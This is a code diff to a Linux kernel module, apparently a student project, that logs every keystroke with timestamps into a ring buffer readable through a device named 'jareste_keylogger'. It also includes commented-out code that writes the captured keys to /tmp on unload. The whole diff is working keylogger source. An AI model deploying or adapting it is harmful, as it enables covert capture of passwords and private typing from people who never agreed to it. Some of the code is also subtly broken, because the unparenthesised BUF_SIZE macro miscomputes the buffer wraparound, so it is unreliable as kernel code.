@@ -6,8 +6,9 @@
 #include <linux/uaccess.h>
 #include <linux/ktime.h>
 #include <linux/input.h>
+#include <linux/slab.h>
 
-#define BUF_SIZE 4096 /* 16 Kb */
+#define BUF_SIZE 4096 * 4 /* 16 Kb */
 
 typedef struct {
     const char *name;
@@ -135,7 +136,8 @@ KeyMap key_table[] = {
 
 
 static char log_buffer[BUF_SIZE];
-static size_t log_index = 0;
+static size_t log_start = 0;
+static size_t log_end = 0;
 static DEFINE_MUTEX(log_lock);
 
 static int key_event_notifier(struct notifier_block *nb, unsigned long action, void *data);
@@ -152,7 +154,7 @@ static const struct file_operations fops = {
 
 static struct miscdevice keyboard_misc_device = {
     .minor = MISC_DYNAMIC_MINOR,
-    .name = "module_keyboard",
+    .name = "jareste_keylogger",
     .fops = &fops,
 };
 
@@ -173,28 +175,40 @@ static int key_event_notifier(struct notifier_block *nb, unsigned long action, v
         time64_to_tm(ts.tv_sec, 0, &tm);
 
         len = snprintf(entry, sizeof(entry), "%02d:%02d:%02d: %s (%u) %s\n",
-                       tm.tm_hour, tm.tm_min, tm.tm_sec, key_table[param->value].name,\
-                       param->value, param->down ? "Pressed" : "Released");
+                       tm.tm_hour, tm.tm_min, tm.tm_sec,
+                       key_table[param->value].name, param->value,
+                       param->down ? "Pressed" : "Released");
 
         mutex_lock(&log_lock);
-        /* MUST be into the mutex otherwise datarace condition may appear. 
-         * consider if it's better locking it on top and just checking it that must be attomic
-         * or locking it here.
-         */
+
         if (param->down == last_keydown && param->value == last_keycode)
         {
             mutex_unlock(&log_lock);
-
             return NOTIFY_OK;
         }
 
         last_keycode = param->value;
         last_keydown = param->down;
 
-        if (log_index + len < BUF_SIZE)
+        while ((log_end + len) % BUF_SIZE == log_start)
         {
-            memcpy(log_buffer + log_index, entry, len);
-            log_index += len;
+            size_t first_entry_len = strnlen(log_buffer + log_start, BUF_SIZE - log_start) + 1;
+            log_start = (log_start + first_entry_len) % BUF_SIZE;
+        }
+
+        if (len <= BUF_SIZE)
+        {
+            if (log_end + len <= BUF_SIZE)
+            {
+                memcpy(log_buffer + log_end, entry, len);
+            }
+            else
+            {
+                size_t first_chunk = BUF_SIZE - log_end;
+                memcpy(log_buffer + log_end, entry, first_chunk);
+                memcpy(log_buffer, entry + first_chunk, len - first_chunk);
+            }
+            log_end = (log_end + len) % BUF_SIZE;
         }
         mutex_unlock(&log_lock);
     }
@@ -203,23 +217,43 @@ static int key_event_notifier(struct notifier_block *nb, unsigned long action, v
 
 static ssize_t keyboard_read(struct file *file, char __user *buf, size_t count, loff_t *ppos)
 {
-    ssize_t ret;
+    ssize_t ret = 0;
 
     mutex_lock(&log_lock);
-    if (*ppos >= log_index)
-    {
-        ret = 0;
-    }
-    else
-    {
-        ret = min(count, log_index - *ppos);
-        if (copy_to_user(buf, log_buffer + *ppos, ret))
-            ret = -EFAULT;
-        else
-            *ppos += ret;
-    }
-    mutex_unlock(&log_lock);
 
+    if (log_start != log_end)
+    {
+        size_t available_data;
+
+        if (log_start < log_end)
+            available_data = log_end - log_start;
+        else
+            available_data = BUF_SIZE - log_start + log_end;
+
+        ret = min(count, available_data);
+
+        if (log_start + ret <= BUF_SIZE)
+        {
+            if (copy_to_user(buf, log_buffer + log_start, ret))
+                ret = -EFAULT;
+        }
+        else
+        {
+            size_t first_chunk = BUF_SIZE - log_start;
+            if (copy_to_user(buf, log_buffer + log_start, first_chunk) ||
+                copy_to_user(buf + first_chunk, log_buffer, ret - first_chunk))
+            {
+                ret = -EFAULT;
+            }
+        }
+
+        if (ret > 0)
+            log_start = (log_start + ret) % BUF_SIZE;
+
+        *ppos += ret;
+    }
+
+    mutex_unlock(&log_lock);
     return ret;
 }
 
@@ -238,8 +272,39 @@ static int __init keyboard_init(void)
     return ret;
 }
 
-static void __exit keyboard_exit(void)
+static void keyboard_exit(void)
 {
+    // struct file *file;
+    // mm_segment_t old_fs;
+    // loff_t pos = 0;
+    // ssize_t ret;
+
+    // // Open the file for writing
+    // file = filp_open("/tmp/keys_logs.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    // if (IS_ERR(file)) {
+    //     pr_err("Failed to open /tmp/keys_logs.txt\n");
+    //     return;
+    // }
+
+    // // Change the address limit to allow kernel access to user space
+    // old_fs = get_fs();
+    // set_fs(KERNEL_DS);
+
+    // // Write the log buffer to the file
+    // mutex_lock(&log_lock);
+    // ret = kernel_write(file, log_buffer, log_index, &pos);
+    // mutex_unlock(&log_lock);
+
+    // if (ret < 0) {
+    //     pr_err("Failed to write to /tmp/keys_logs.txt\n");
+    // }
+
+    // // Restore the address limit
+    // set_fs(old_fs);
+
+    // // Close the file
+    // filp_close(file, NULL);
+
     unregister_keyboard_notifier(&nb);
     misc_deregister(&keyboard_misc_device);
 }
@@ -248,3 +313,5 @@ module_init(keyboard_init);
 module_exit(keyboard_exit);
 
 MODULE_LICENSE("GPL");
+MODULE_AUTHOR("jareste-");
+MODULE_DESCRIPTION("Keyboard logger");
